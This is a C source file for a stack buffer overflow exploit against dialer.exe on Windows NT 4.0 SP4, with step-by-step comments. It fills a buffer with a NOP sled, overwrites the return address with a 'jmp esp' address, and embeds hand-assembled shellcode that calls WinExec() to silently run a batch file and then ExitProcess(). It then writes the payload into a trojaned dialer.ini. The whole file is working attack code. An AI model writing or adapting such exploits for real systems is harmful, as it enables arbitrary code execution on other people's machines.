#include <stdio.h>
  #include <windows.h>

   int main(void)
{
    FILE *fd;
    char ExploitCode[256];
    int count = 0;
    while (count < 100)
      {
      ExploitCode[count]=0x90;
      count ++;
      }

    // ExploitCode[100] to ExploitCode[103] overwrites the real return address
    // with 0x77F327E5 which contains a "jmp esp" instruction taking us back
    // to our payload of exploit code
   ExploitCode[100]=0xE5;
   ExploitCode[101]=0x27;
   ExploitCode[102]=0xF3;
   ExploitCode[103]=0x77;

   // procedure prologue - push ebp
   // mov ebp,esp
   ExploitCode[104]=0x55;
   ExploitCode[105]=0x8B;

   // This moves into the eax register the address where WinExec() is found
   // in kernel32.dll at address 0x77F1A9DA - This address has been hard-
   // coded in to save room rather than going through LoadLibrary() and
   // GetProcAddress () to get the address - since we've already hard
   // coded in the return address from kernel32.dll - there seems no
   // harm in doing this
   ExploitCode[106]=0xEC;
   ExploitCode[107]=0xB8;
   ExploitCode[108]=0xDA;
   ExploitCode[109]=0xA9;
   ExploitCode[110]=0xF1;
   ExploitCode[111]=0x77;

   // We need some NULLs to terminate a string - to do this we xor the esi
   // register with itself - xor esi,esi
   ExploitCode[112]=0x33;
   ExploitCode[113]=0xF6;

   // These NULLs are then pushed onto the stack - push esi
   ExploitCode[114]=0x56;

   // Now the name of the batch file to be run is pushed onto the stack
   // We'll let WinExec() pick up the file - we use push here
   // to push on "tab." (code.bat)
   ExploitCode[115]=0x68;
   ExploitCode[116]=0x2E;
   ExploitCode[117]=0x62;
   ExploitCode[118]=0x61;
   ExploitCode[119]=0x74;

   // And now we push on "edoc"
   ExploitCode[120]=0x68;
   ExploitCode[121]=0x63;
   ExploitCode[122]=0x6F;
   ExploitCode[123]=0x64;
   ExploitCode[124]=0x65;

   // We push the esi (our NULLs) again - this will be used by WinExec() to
  determine
    // whether to display a window on the desktop or not - in this case it will
  not
   ExploitCode[125]=0x56;

  // The address of the "c" of code.bat is loaded into the edi register -
  this
    // becomes a pointer to the name of what we want to tell WinExec() to run
   ExploitCode[126]=0x8D;
   ExploitCode[127]=0x7D;
   ExploitCode[128]=0xF4;

   // This is then pushed onto the stack
   ExploitCode[129]=0x57;

   // With everything primed we then call WinExec() - this will then run
  code.bat
   ExploitCode[130]=0xFF;
   ExploitCode[131]=0xD0;

   // With the batch file running we then call ExitProcess () to stop
  dialer.exe
    // from churning out an Access Violation message - first the procedure
    //prologue push ebp and movebp,esp
   ExploitCode[132]=0x55;
   ExploitCode[133]=0x8B;
   ExploitCode[134]=0xEC;

   // We need to give ExitProcess() an exit code - we'll give it 0 to use - we
  need
    // some NULLs then - xor esi,esi
   ExploitCode[135]=0x33;
   ExploitCode[136]=0xF6;

   // and we need them on the stack - push esi
   ExploitCode[137]=0x56;

   // Now we mov the address for ExitProcess() into the EAX register - again
  we
    // we hard code this in tieing this exploit to NT 4.0 SP4
   ExploitCode[138]=0xB8;
   ExploitCode[139]=0xE6;
   ExploitCode[140]=0x9F;
   ExploitCode[141]=0xF1;
   ExploitCode[142]=0x77;

   // And then finally call it
   ExploitCode[143]=0xFF;
   ExploitCode[144]=0xD0;

   // Now to create the trojaned dialer.ini file
   fd = fopen("dialer.ini", "w+");
   if (fd == NULL)
     {
     printf("Couldn't create dialer.ini");
     return 0;
     }
   // Give dialer.exe what it needs from dialer.ini
   fprintf(fd,"[Preference]\nPreferred Line=148446\nPreferred Address=0\nMain
  Window  Left/Top=489, 173\n[Last dialed numbers]\nLast dialed 1=");

   // And inject our exploit code
   fprintf(fd,ExploitCode);

          fclose(fd);
}
